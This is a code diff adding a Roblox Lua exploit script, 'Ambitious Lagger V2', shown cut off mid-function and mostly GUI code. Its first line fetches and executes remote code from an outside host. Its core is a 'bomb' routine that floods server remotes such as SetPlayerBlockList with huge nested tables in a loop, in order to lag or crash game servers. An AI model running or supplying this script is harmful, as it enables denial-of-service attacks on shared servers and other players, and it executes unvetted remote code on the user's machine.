@@ -1,0 +1,1347 @@
+loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=kf2gc7l0"))()
+
+.gg/freesource
+local Players           = game:GetService("Players")
+local UserInputService  = game:GetService("UserInputService")
+local RunService        = game:GetService("RunService")
+local TweenService      = game:GetService("TweenService")
+local HttpService       = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local NetworkClient     = game:GetService("NetworkClient")
+
+local LocalPlayer = Players.LocalPlayer
+
+local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+
+local UI_SCALE  = IS_MOBILE and 0.85 or 1
+
+local BG_ASSET    = "rbxassetid://133334160999541"
+local CONFIG_FILE = "AmbitiousLaggerV2.json"
+
+local BG_MODES = {
+    { name = "Normal",  asset = BG_ASSET },
+
+    { name = "Lucid",   asset = "rbxassetid://71767495554392" },
+    { name = "Glitter", asset = "rbxassetid://102287713403668" },
+
+    { name = "Leopard", asset = "rbxassetid://101626300846895",
+      size = UDim2.fromScale(1.12, 0.98),
+      scaleType = Enum.ScaleType.Stretch },
+
+    { name = "Flowers", asset = "rbxassetid://109178387542116",
+      size = UDim2.fromScale(1.30, 1.30),
+      scaleType = Enum.ScaleType.Stretch },
+
+    { name = "Gold",    asset = "rbxassetid://127674701913598" },
+}
+
+local DEFAULTS = {
+    Enabled   = false,
+    Keybind   = "RightShift",
+    Mode      = "Low End",
+    BGMode    = "Normal",
+    PosX      = nil,
+    PosY      = nil,
+    Minimized = false,
+}
+
+local canSave = (typeof(writefile) == "function") and (typeof(readfile) == "function")
+local canRead = canSave and (typeof(isfile) == "function")
+
+local Config = {}
+for k, v in pairs(DEFAULTS) do Config[k] = v end
+
+local function loadConfig()
+    if not canRead then return end
+    local ok, data = pcall(function()
+        if not isfile(CONFIG_FILE) then return nil end
+        return HttpService:JSONDecode(readfile(CONFIG_FILE))
+    end)
+    if ok and type(data) == "table" then
+        for k, _ in pairs(DEFAULTS) do
+            if data[k] ~= nil then Config[k] = data[k] end
+        end
+    end
+end
+
+local savePending = false
+local function saveConfig()
+    if not canSave or savePending then return end
+    savePending = true
+    task.delay(0.4, function()
+        savePending = false
+        pcall(function()
+            writefile(CONFIG_FILE, HttpService:JSONEncode(Config))
+        end)
+    end)
+end
+
+loadConfig()
+
+local function keyFromName(name)
+    local ok, kc = pcall(function() return Enum.KeyCode[name] end)
+    if ok and typeof(kc) == "EnumItem" then return kc end
+    return Enum.KeyCode.RightShift
+end
+
+local function bgIndexFromName(name)
+    for i, m in ipairs(BG_MODES) do
+        if m.name == name then return i end
+    end
+    return 1
+end
+
+local COL = {
+    Black       = Color3.fromRGB(12, 10, 16),
+    Panel       = Color3.fromRGB(20, 16, 28),
+    Row         = Color3.fromRGB(30, 24, 44),
+    Purple      = Color3.fromRGB(138, 43, 226),
+    Violet      = Color3.fromRGB(170, 110, 255),
+    VioletLite  = Color3.fromRGB(205, 165, 255),
+    PurpleDeep  = Color3.fromRGB(70, 30, 120),
+    PurpleBright= Color3.fromRGB(165, 95, 255),
+    PurpleDim   = Color3.fromRGB(90, 50, 150),
+    White       = Color3.fromRGB(245, 245, 250),
+    SubText     = Color3.fromRGB(170, 160, 190),
+}
+
+local FONT = Enum.Font.GothamBlack
+
+local State = {
+    Enabled = Config.Enabled,
+    Keybind = keyFromName(Config.Keybind),
+    Mode    = Config.Mode,
+    BGMode  = Config.BGMode,
+    BGIndex = bgIndexFromName(Config.BGMode),
+}
+
+local function create(class, props, children)
+    local inst = Instance.new(class)
+    for k, v in pairs(props or {}) do inst[k] = v end
+    for _, c in ipairs(children or {}) do c.Parent = inst end
+    return inst
+end
+
+local function corner(parent, r)
+    return create("UICorner", { CornerRadius = UDim.new(0, r or 8), Parent = parent })
+end
+
+local function stroke(parent, color, thick, trans)
+    return create("UIStroke", {
+        Color = color or COL.Purple,
+        Thickness = thick or 1,
+        Transparency = trans or 0.5,
+        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+        Parent = parent,
+    })
+end
+
+local function makeLaggerInstance(cfg, pulseInterval)
+    local S = {
+        cfg           = cfg,
+        pulseInterval = pulseInterval or 0.6,
+
+        enabled     = false,
+        thread      = nil,
+
+        pulseWanted = false,
+        pulseThread = nil,
+
+        cachedRemote = nil,
+    }
+
+    local function getmaxvalue(val)
+        if type(val) ~= "number" then return nil end
+        return 499999 / (val + 2)
+    end
+
+    local function getDirectRemote()
+        local ok, result = pcall(function()
+            return game.RobloxReplicatedStorage.SetPlayerBlockList
+        end)
+        if ok and result and (result:IsA("RemoteEvent")
+            or result:IsA("UnreliableRemoteEvent")
+            or result:IsA("RemoteFunction")) then
+            return result
+        end
+        return nil
+    end
+
+    local function findRemote()
+        if S.cachedRemote and S.cachedRemote.Parent then return S.cachedRemote end
+
+        local paths = {
+            function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
+            function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
+            function() return game:FindFirstChild("SetPlayerBlockList", true) end,
+        }
+        for _, pathFn in ipairs(paths) do
+            local ok, result = pcall(pathFn)
+            if ok and result and (result:IsA("RemoteEvent")
+                or result:IsA("UnreliableRemoteEvent")
+                or result:IsA("RemoteFunction")) then
+                S.cachedRemote = result
+                return result
+            end
+        end
+
+        local services = { ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage") }
+        for _, service in ipairs(services) do
+            if service then
+                for _, obj in ipairs(service:GetDescendants()) do
+                    if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
+                        local name = obj.Name:lower()
+                        if name:find("block") or name:find("steal") or name:find("accept")
+                            or name:find("report") or name:find("player") then
+                            S.cachedRemote = obj
+                            return obj
+                        end
+                    end
+                end
+            end
+        end
+
+        for _, service in ipairs(services) do
+            if service then
+                for _, obj in ipairs(service:GetDescendants()) do
+                    if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
+                        S.cachedRemote = obj
+                        return obj
+                    end
+                end
+            end
+        end
+
+        return nil
+    end
+
+    local function getRemote()
+        local direct = getDirectRemote()
+        if direct then return direct end
+        return findRemote()
+    end
+
+    local function bomb(tableincrease, tries)
+        local maintable = {}
+        local spammedtable = {}
+        table.insert(spammedtable, {})
+        local z = spammedtable[1]
+        for i = 1, tableincrease do
+            local tableins = {}
+            table.insert(z, tableins)
+            z = tableins
+        end
+
+        local maximum = getmaxvalue(tableincrease) or 9999999
+        for i = 1, maximum do
+            table.insert(maintable, spammedtable)
+            if i % 10000 == 0 then task.wait() end
+        end
+
+        local remote = getRemote()
+        if remote then
+            for i = 1, tries do
+                local ok, err = pcall(function()
+                    if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                        remote:FireServer(maintable)
+                    elseif remote:IsA("RemoteFunction") then
+                        remote:InvokeServer(maintable)
+                    end
+                end)
+                if not ok then
+                    warn("[Ambitious Lagger V2] Remote call failed: " .. tostring(err))
+                    S.cachedRemote = nil
+                end
+            end
+        else
+            warn("[Ambitious Lagger V2] No remote found!")
+        end
+    end
+
+    local function startCrashLoop()
+        while S.enabled do
+            pcall(function()
+                NetworkClient:SetOutgoingKBPSLimit(math.huge)
+            end)
+
+            pcall(function()
+                settings().Network.IncomingReplicationLag = 0
+            end)
+
+            bomb(S.cfg.tableInc, S.cfg.tries)
+
+            pcall(function()
+                for i = 1, 50 do
+                    game:GetService("Stats"):Get("Network.ServerStatsItem")
+                end
+            end)
+
+            task.wait(S.cfg.waitTime)
+        end
+    end
+
+    local function pulseTick(on)
+        if on then
+            if not S.enabled then
+                S.enabled = true
+                if not S.thread then
+                    S.thread = coroutine.create(startCrashLoop)
+                    coroutine.resume(S.thread)
+                end
+            end
+        else
+            if S.enabled then
+                S.enabled = false
+                if S.thread then
+                    pcall(function() coroutine.close(S.thread) end)
+                    S.thread = nil
+                end
+            end
+        end
+    end
+
+    function S:start()
+        if self.pulseThread then return end
+        self.pulseWanted = true
+        self.pulseThread = task.spawn(function()
+            while self.pulseWanted do
+                pulseTick(true)
+                task.wait(self.pulseInterval)
+                if not self.pulseWanted then break end
+                pulseTick(false)
+                task.wait(self.pulseInterval)
+            end
+            pulseTick(false)
+            self.pulseThread = nil
+        end)
+    end
+
+    function S:stop()
+        self.pulseWanted = false
+    end
+
+    return S
+end
+
+local hardCfg      = { tableInc = 290, tries = 1, waitTime = 0.6 }
+local hardInstance = makeLaggerInstance(hardCfg, 0.6)
+
+local extremeCfgA = { tableInc = 290, tries = 1, waitTime = 0.6 }
+local extremeCfgB = { tableInc = 290, tries = 1, waitTime = 0.6 }
+local extremeA    = makeLaggerInstance(extremeCfgA, 0.6)
+local extremeB    = makeLaggerInstance(extremeCfgB, 0.6)
+
+local function startHardLagger()    hardInstance:start() end
+local function stopHardLagger()     hardInstance:stop()  end
+
+local function startExtremeLagger()
+    extremeA:start()
+    extremeB:start()
+end
+local function stopExtremeLagger()
+    extremeA:stop()
+    extremeB:stop()
+end
+
+local lowCfg = {
+    POWER    = 97000,
+    DEPTH    = 180,
+    INTERVAL = 0.6,
+}
+
+local lowActive       = false
+local lowThread       = nil
+local lowCachedRemote = nil
+
+local function buildLowPayload(power)
+    local maintable    = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for _ = 1, lowCfg.DEPTH do
+        local t = {}
+        table.insert(z, t)
+        z = t
+    end
+    local maxRep = math.floor(power / (lowCfg.DEPTH + 2))
+    for _ = 1, maxRep do
+        table.insert(maintable, spammedtable)
+    end
+    return maintable
+end
+
+local function getLowRemote()
+    if lowCachedRemote and lowCachedRemote.Parent then return lowCachedRemote end
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if rrs then
+        lowCachedRemote = rrs:FindFirstChild("SetPlayerBlockList")
+    end
+    return lowCachedRemote
+end
+
+local function fireLowOnce()
+    local remote = getLowRemote()
+    if not remote then return end
+    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
+    local payload = buildLowPayload(lowCfg.POWER)
+    pcall(function() remote:FireServer(payload) end)
+end
+
+local function startLowEnd()
+    if lowThread then return end
+    lowActive = true
+    lowThread = task.spawn(function()
+        while lowActive do
+            fireLowOnce()
+            task.wait(lowCfg.INTERVAL)
+        end
+        lowThread = nil
+    end)
+end
+
+local function stopLowEnd()
+    lowActive = false
+    if lowThread then
+        pcall(task.cancel, lowThread)
+        lowThread = nil
+    end
+end
+
+local function stopAllModes()
+    stopHardLagger()
+    stopExtremeLagger()
+    stopLowEnd()
+end
+
+local function startModeFor(mode)
+    if mode == "Hard" then
+        startHardLagger()
+    elseif mode == "Extreme" then
+        startExtremeLagger()
+    elseif mode == "Low End" then
+        startLowEnd()
+    end
+end
+
+local parentGui = (gethui and gethui()) or game:GetService("CoreGui")
+local old = parentGui:FindFirstChild("AmbitiousLaggerV2")
+if old then old:Destroy() end
+
+local ScreenGui = create("ScreenGui", {
+    Name = "AmbitiousLaggerV2",
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    ResetOnSpawn = false,
+    IgnoreGuiInset = true,
+    Parent = parentGui,
+})
+
+local WIDTH       = 320
+local FULL_H      = 294
+local COLLAPSED_H = 68
+
+local START_POS
+if Config.PosX and Config.PosY then
+    START_POS = UDim2.fromOffset(Config.PosX, Config.PosY)
+else
+    if IS_MOBILE then
+        START_POS = UDim2.new(0.5, -WIDTH/2, 0.5, -180)
+    else
+        START_POS = UDim2.new(0.5, -WIDTH/2, 0.5, -147)
+    end
+end
+
+local Main = create("Frame", {
+    Name = "Main",
+    Size = UDim2.fromOffset(WIDTH, FULL_H),
+    Position = START_POS,
+    BackgroundColor3 = COL.Panel,
+    BackgroundTransparency = 0.05,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    Parent = ScreenGui,
+})
+corner(Main, 14)
+stroke(Main, COL.Purple, 1.4, 0.3)
+
+local uiScale = create("UIScale", {
+    Name = "AdaptiveScale",
+    Scale = UI_SCALE,
+    Parent = Main,
+})
+
+local function resolveBGView(entry)
+    local size = entry.size or UDim2.fromScale(1, 1)
+    local pos
+    if entry.size then
+        pos = UDim2.fromScale(
+            (1 - entry.size.X.Scale) / 2,
+            (1 - entry.size.Y.Scale) / 2
+        )
+    else
+        pos = UDim2.fromScale(0, 0)
+    end
+    local scaleType = entry.scaleType or Enum.ScaleType.Crop
+    return size, pos, scaleType
+end
+
+local initialEntry = BG_MODES[State.BGIndex]
+local initSize, initPos, initScaleType = resolveBGView(initialEntry)
+
+local BGImage = create("ImageLabel", {
+    Name = "BGImage",
+    Size = initSize,
+    Position = initPos,
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    Image = initialEntry.asset,
+    ScaleType = initScaleType,
+    ImageTransparency = 0.25,
+    ZIndex = 0,
+    Parent = Main,
+})
+corner(BGImage, 14)
+
+local Overlay = create("Frame", {
+    Name = "Overlay",
+    Size = UDim2.fromScale(1, 1),
+    BackgroundColor3 = COL.Black,
+    BackgroundTransparency = 0.45,
+    BorderSizePixel = 0,
+    ZIndex = 1,
+    Parent = Main,
+})
+corner(Overlay, 14)
+create("UIGradient", {
+    Rotation = 90,
+    Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 0.6),
+        NumberSequenceKeypoint.new(1, 0.25),
+    }),
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, COL.Panel),
+        ColorSequenceKeypoint.new(1, COL.Black),
+    }),
+    Parent = Overlay,
+})
+
+local Content = create("Frame", {
+    Name = "Content",
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    ZIndex = 2,
+    Parent = Main,
+})
+
+create("UIPadding", {
+    PaddingTop = UDim.new(0, 12),
+    PaddingBottom = UDim.new(0, 12),
+    PaddingLeft = UDim.new(0, 12),
+    PaddingRight = UDim.new(0, 12),
+    Parent = Content,
+})
+
+create("UIListLayout", {
+    FillDirection = Enum.FillDirection.Vertical,
+    HorizontalAlignment = Enum.HorizontalAlignment.Center,
+    SortOrder = Enum.SortOrder.LayoutOrder,
+    Padding = UDim.new(0, 10),
+    Parent = Content,
+})
+
+local TitleBar = create("Frame", {
+    Name = "TitleBar",
+    Size = UDim2.new(1, 0, 0, 44),
+    BackgroundTransparency = 1,
+    LayoutOrder = 1,
+    Parent = Content,
+})
+
+local Title = create("TextLabel", {
+    Name = "Title",
+    Size = UDim2.new(1, -62, 0, 24),
+    Position = UDim2.fromOffset(0, 0),
+    BackgroundTransparency = 1,
+    Text = "Ambitious Lagger V2",
+    Font = FONT,
+    TextSize = 20,
+    TextColor3 = COL.White,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    Parent = TitleBar,
+})
+
+local Subtitle = create("TextLabel", {
+    Name = "Subtitle",
+    Size = UDim2.new(1, 0, 0, 14),
+    Position = UDim2.fromOffset(0, 25),
+    BackgroundTransparency = 1,
+    Text = "discord.gg/ambitiouss",
+    Font = FONT,
+    TextSize = 13,
+    TextColor3 = COL.White,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    Parent = TitleBar,
+})
+
+create("UIStroke", {
+    Color = COL.Black,
+    Thickness = 1.6,
+    Transparency = 0.25,
+    Parent = Subtitle,
+})
+
+local SubGrad = create("UIGradient", {
+    Color = ColorSequence.new(COL.VioletLite),
+    Rotation = 0,
+    Parent = Subtitle,
+})
+
+create("UIStroke", {
+    Color = COL.Purple,
+    Thickness = 1,
+    Transparency = 0.4,
+    Parent = Title,
+})
+
+local function makeWinButton(name, symbol, xOffset, hoverColor)
+    local btn = create("TextButton", {
+        Name = name,
+        Size = UDim2.fromOffset(24, 24),
+        Position = UDim2.new(1, xOffset, 0, 0),
+        BackgroundColor3 = COL.Row,
+        BackgroundTransparency = 0.5,
+        Text = symbol,
+        Font = FONT,
+        TextSize = 13,
+        TextColor3 = COL.SubText,
+        AutoButtonColor = false,
+        ZIndex = 5,
+        Parent = TitleBar,
+    })
+    corner(btn, 7)
+    local st = stroke(btn, COL.PurpleDim, 1, 0.55)
+
+    local INFO = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, INFO, {
+            BackgroundTransparency = 0.1,
+            BackgroundColor3 = hoverColor,
+            TextColor3 = COL.White,
+        }):Play()
+        TweenService:Create(st, INFO, { Transparency = 0, Color = COL.Violet }):Play()
+    end)
+
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, INFO, {
+            BackgroundTransparency = 0.5,
+            BackgroundColor3 = COL.Row,
+            TextColor3 = COL.SubText,
+        }):Play()
+        TweenService:Create(st, INFO, { Transparency = 0.55, Color = COL.PurpleDim }):Play()
+    end)
+
+    btn.MouseButton1Down:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.08), {
+            Size = UDim2.fromOffset(21, 21),
+            Position = UDim2.new(1, xOffset + 2, 0, 2),
+        }):Play()
+    end)
+    btn.MouseButton1Up:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Size = UDim2.fromOffset(24, 24),
+            Position = UDim2.new(1, xOffset, 0, 0),
+        }):Play()
+    end)
+
+    return btn
+end
+
+local MinBtn   = makeWinButton("MinimizeBtn", "-", -54, COL.PurpleDeep)
+local CloseBtn = makeWinButton("CloseBtn",    "X", -26, COL.PurpleBright)
+
+local TitleGrad = create("UIGradient", {
+    Color = ColorSequence.new(COL.Violet),
+    Rotation = 0,
+    Parent = Title,
+})
+
+local Row1 = create("Frame", {
+    Name = "Row_Enable",
+    Size = UDim2.new(1, 0, 0, 44),
+    BackgroundColor3 = COL.Row,
+    BackgroundTransparency = 0.45,
+    BorderSizePixel = 0,
+    LayoutOrder = 2,
+    Parent = Content,
+})
+corner(Row1, 10)
+stroke(Row1, COL.PurpleDim, 1, 0.6)
+
+create("TextLabel", {
+    Size = UDim2.new(1, -110, 1, 0),
+    Position = UDim2.fromOffset(12, 0),
+    BackgroundTransparency = 1,
+    Text = "Lagger",
+    Font = FONT,
+    TextSize = 15,
+    TextColor3 = COL.White,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    Parent = Row1,
+})
+
+local EnableBtn = create("TextButton", {
+    Name = "EnableBtn",
+    Size = UDim2.fromOffset(86, 30),
+    Position = UDim2.new(1, -96, 0.5, -15),
+    BackgroundColor3 = COL.PurpleDeep,
+    Text = "Enable",
+    Font = FONT,
+    TextSize = 14,
+    TextColor3 = COL.VioletLite,
+    AutoButtonColor = false,
+    Parent = Row1,
+})
+corner(EnableBtn, 8)
+local EnableStroke = stroke(EnableBtn, COL.Purple, 1, 0.4)
+
+local Row2 = create("Frame", {
+    Name = "Row_Keybind",
+    Size = UDim2.new(1, 0, 0, 44),
+    BackgroundColor3 = COL.Row,
+    BackgroundTransparency = 0.55,
+    BorderSizePixel = 0,
+    LayoutOrder = 3,
+    Parent = Content,
+})
+corner(Row2, 10)
+stroke(Row2, COL.PurpleDim, 1, 0.6)
+
+create("TextLabel", {
+    Size = UDim2.new(1, -130, 1, 0),
+    Position = UDim2.fromOffset(12, 0),
+    BackgroundTransparency = 1,
+    Text = "Keybind",
+    Font = FONT,
+    TextSize = 15,
+    TextColor3 = COL.White,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    Parent = Row2,
+})
+
+local KeybindBtn = create("TextButton", {
+    Name = "KeybindBtn",
+    Size = UDim2.fromOffset(116, 30),
+    Position = UDim2.new(1, -126, 0.5, -15),
+    BackgroundColor3 = COL.Panel,
+    Text = State.Keybind.Name,
+    Font = FONT,
+    TextSize = 13,
+    TextColor3 = COL.Violet,
+    AutoButtonColor = false,
+    Parent = Row2,
+})
+corner(KeybindBtn, 8)
+local KeybindStroke = stroke(KeybindBtn, COL.Purple, 1, 0.4)
+
+local Row3 = create("Frame", {
+    Name = "Row_Mode",
+    Size = UDim2.new(1, 0, 0, 44),
+    BackgroundColor3 = COL.Row,
+    BackgroundTransparency = 0.55,
+    BorderSizePixel = 0,
+    LayoutOrder = 4,
+    Parent = Content,
+})
+corner(Row3, 10)
+stroke(Row3, COL.PurpleDim, 1, 0.6)
+
+local SwitchBG = create("Frame", {
+    Name = "SwitchBG",
+    Size = UDim2.new(1, -20, 0, 30),
+    Position = UDim2.new(0, 10, 0.5, -15),
+    BackgroundColor3 = COL.Black,
+    BackgroundTransparency = 0.2,
+    BorderSizePixel = 0,
+    Parent = Row3,
+})
+corner(SwitchBG, 8)
+stroke(SwitchBG, COL.PurpleDim, 1, 0.5)
+
+local Indicator = create("Frame", {
+    Name = "Indicator",
+    Size = UDim2.new(1/3, -4, 1, -4),
+    Position = UDim2.new(0, 2, 0, 2),
+    BackgroundColor3 = COL.Purple,
+    BorderSizePixel = 0,
+    ZIndex = 1,
+    Parent = SwitchBG,
+})
+corner(Indicator, 7)
+create("UIGradient", {
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, COL.Purple),
+        ColorSequenceKeypoint.new(1, COL.Violet),
+    }),
+    Parent = Indicator,
+})
+
+local LowBtn = create("TextButton", {
+    Name = "LowBtn",
+    Size = UDim2.new(1/3, 0, 1, 0),
+    Position = UDim2.new(0, 0, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "Low End",
+    Font = FONT,
+    TextSize = 12,
+    TextColor3 = COL.White,
+    ZIndex = 2,
+    Parent = SwitchBG,
+})
+
+local HardBtn = create("TextButton", {
+    Name = "HardBtn",
+    Size = UDim2.new(1/3, 0, 1, 0),
+    Position = UDim2.new(1/3, 0, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "Hard",
+    Font = FONT,
+    TextSize = 12,
+    TextColor3 = COL.SubText,
+    ZIndex = 2,
+    Parent = SwitchBG,
+})
+
+local ExtremeBtn = create("TextButton", {
+    Name = "ExtremeBtn",
+    Size = UDim2.new(1/3, 0, 1, 0),
+    Position = UDim2.new(2/3, 0, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "Extreme",
+    Font = FONT,
+    TextSize = 12,
+    TextColor3 = COL.SubText,
+    ZIndex = 2,
+    Parent = SwitchBG,
+})
+
+local Row4 = create("Frame", {
+    Name = "Row_BGMode",
+    Size = UDim2.new(1, 0, 0, 44),
+    BackgroundColor3 = COL.Row,
+    BackgroundTransparency = 0.55,
+    BorderSizePixel = 0,
+    LayoutOrder = 5,
+    Parent = Content,
+})
+corner(Row4, 10)
+stroke(Row4, COL.PurpleDim, 1, 0.6)
+
+create("TextLabel", {
+    Size = UDim2.new(1, -180, 1, 0),
+    Position = UDim2.fromOffset(12, 0),
+    BackgroundTransparency = 1,
+    Text = "BG Mode",
+    Font = FONT,
+    TextSize = 15,
+    TextColor3 = COL.White,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    Parent = Row4,
+})
+
+local BGSlider = create("Frame", {
+    Name = "BGSlider",
+    Size = UDim2.fromOffset(160, 30),
+    Position = UDim2.new(1, -172, 0.5, -15),
+    BackgroundColor3 = COL.Black,
+    BackgroundTransparency = 0.2,
+    BorderSizePixel = 0,
+    Parent = Row4,
+})
+corner(BGSlider, 8)
+stroke(BGSlider, COL.PurpleDim, 1, 0.5)
+
+local BGLeft = create("TextButton", {
+    Name = "BGLeft",
+    Size = UDim2.fromOffset(28, 30),
+    Position = UDim2.fromOffset(0, 0),
+    BackgroundTransparency = 1,
+    Text = "‹",
+    Font = FONT,
+    TextSize = 20,
+    TextColor3 = COL.Violet,
+    AutoButtonColor = false,
+    ZIndex = 2,
+    Parent = BGSlider,
+})
+
+local BGName = create("TextLabel", {
+    Name = "BGName",
+    Size = UDim2.new(1, -56, 1, 0),
+    Position = UDim2.fromOffset(28, 0),
+    BackgroundTransparency = 1,
+    Text = BG_MODES[State.BGIndex].name,
+    Font = FONT,
+    TextSize = 13,
+    TextColor3 = COL.White,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    ZIndex = 2,
+    Parent = BGSlider,
+})
+
+local BGRight = create("TextButton", {
+    Name = "BGRight",
+    Size = UDim2.fromOffset(28, 30),
+    Position = UDim2.new(1, -28, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "›",
+    Font = FONT,
+    TextSize = 20,
+    TextColor3 = COL.Violet,
+    AutoButtonColor = false,
+    ZIndex = 2,
+    Parent = BGSlider,
+})
+
+local function arrowHover(btn)
+    local INFO = TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, INFO, { TextColor3 = COL.VioletLite }):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, INFO, { TextColor3 = COL.Violet }):Play()
+    end)
+    btn.MouseButton1Down:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.06), { TextSize = 16 }):Play()
+    end)
+    btn.MouseButton1Up:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.14, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { TextSize = 20 }):Play()
+    end)
+end
+arrowHover(BGLeft)
+arrowHover(BGRight)
+
+local function applyBG(mode, skipSave)
+    State.BGMode = mode
+    Config.BGMode = mode
+
+    local entry
+    for _, m in ipairs(BG_MODES) do
+        if m.name == mode then entry = m break end
+    end
+    if not entry then entry = BG_MODES[1] end
+
+    local size, pos, scaleType = resolveBGView(entry)
+
+    TweenService:Create(BGImage, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        ImageTransparency = 0.65,
+    }):Play()
+
+    task.delay(0.14, function()
+        BGImage.Image      = entry.asset
+        BGImage.Size       = size
+        BGImage.Position   = pos
+        BGImage.ScaleType  = scaleType
+        TweenService:Create(BGImage, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            ImageTransparency = 0.25,
+        }):Play()
+    end)
+
+    BGName.Text = mode
+    BGName.TextColor3 = COL.VioletLite
+    TweenService:Create(BGName, TweenInfo.new(0.35), { TextColor3 = COL.White }):Play()
+
+    if not skipSave then saveConfig() end
+end
+
+local function cycleBG(dir)
+    local i = State.BGIndex + dir
+    local n = #BG_MODES
+    if i < 1 then i = n end
+    if i > n then i = 1 end
+    State.BGIndex = i
+    applyBG(BG_MODES[i].name)
+end
+
+BGLeft.MouseButton1Click:Connect(function() cycleBG(-1) end)
+BGRight.MouseButton1Click:Connect(function() cycleBG(1) end)
+
+local function setEnabled(on, skipSave)
+    State.Enabled  = on
+    Config.Enabled = on
+
+    EnableBtn.Text = on and "Disable" or "Enable"
+    TweenService:Create(EnableBtn, TweenInfo.new(0.2), {
+        BackgroundColor3 = on and COL.PurpleBright or COL.PurpleDeep,
+        TextColor3       = on and COL.White or COL.VioletLite,
+    }):Play()
+    TweenService:Create(EnableStroke, TweenInfo.new(0.2), {
+        Transparency = on and 0 or 0.4,
+    }):Play()
+
+    if on then
+        startModeFor(State.Mode)
+    else
+        stopAllModes()
+    end
+
+    if not skipSave then saveConfig() end
+end
+
+EnableBtn.MouseButton1Click:Connect(function()
+    setEnabled(not State.Enabled)
+end)
+
+local listeningKey = false
+local pulseConn
+
+local function stopListening()
+    listeningKey = false
+    if pulseConn then pulseConn:Disconnect() pulseConn = nil end
+    local info = TweenInfo.new(0.18)
+    TweenService:Create(KeybindBtn, info, {
+        BackgroundColor3 = COL.Panel,
+        TextColor3 = COL.Violet,
+    }):Play()
+    TweenService:Create(KeybindStroke, info, {
+        Transparency = 0.4,
+        Color = COL.Purple,
+        Thickness = 1,
+    }):Play()
+end
+
+KeybindBtn.MouseButton1Click:Connect(function()
+    if listeningKey then return end
+    listeningKey = true
+    KeybindBtn.Text = "..."
+
+    local info = TweenInfo.new(0.18)
+    TweenService:Create(KeybindBtn, info, {
+        BackgroundColor3 = COL.PurpleBright,
+        TextColor3 = COL.White,
+    }):Play()
+    TweenService:Create(KeybindStroke, info, {
+        Transparency = 0,
+        Color = COL.VioletLite,
+        Thickness = 2,
+    }):Play()
+
+    local t = 0
+    pulseConn = RunService.RenderStepped:Connect(function(dt)
+        t = t + dt * 4
+        local k = (math.sin(t) + 1) / 2
+        KeybindBtn.BackgroundColor3 = COL.PurpleDeep:Lerp(COL.PurpleBright, k)
+        KeybindStroke.Transparency = 0.35 * (1 - k)
+    end)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if listeningKey and input.UserInputType == Enum.UserInputType.Keyboard then
+        if input.KeyCode == Enum.KeyCode.Escape then
+            KeybindBtn.Text = State.Keybind.Name
+            stopListening()
+            return
+        end
+        State.Keybind  = input.KeyCode
+        Config.Keybind = input.KeyCode.Name
+        KeybindBtn.Text = input.KeyCode.Name
+        stopListening()
+        saveConfig()
+        return
+    end
+    if not gpe and not listeningKey and input.KeyCode == State.Keybind then
+        setEnabled(not State.Enabled)
+    end
+end)
+
+local TWEEN = TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+
+local function setMode(mode, skipSave)
+    State.Mode  = mode
+    Config.Mode = mode
+
+    local pos
+    if mode == "Low End" then
+        pos = UDim2.new(0, 2, 0, 2)
+    elseif mode == "Hard" then
+        pos = UDim2.new(1/3, 2, 0, 2)
+    else
+        pos = UDim2.new(2/3, 2, 0, 2)
+    end
+
+    TweenService:Create(Indicator, TWEEN, { Position = pos }):Play()
+    TweenService:Create(LowBtn, TWEEN, {
+        TextColor3 = (mode == "Low End") and COL.White or COL.SubText
+    }):Play()
+    TweenService:Create(HardBtn, TWEEN, {
+        TextColor3 = (mode == "Hard") and COL.White or COL.SubText
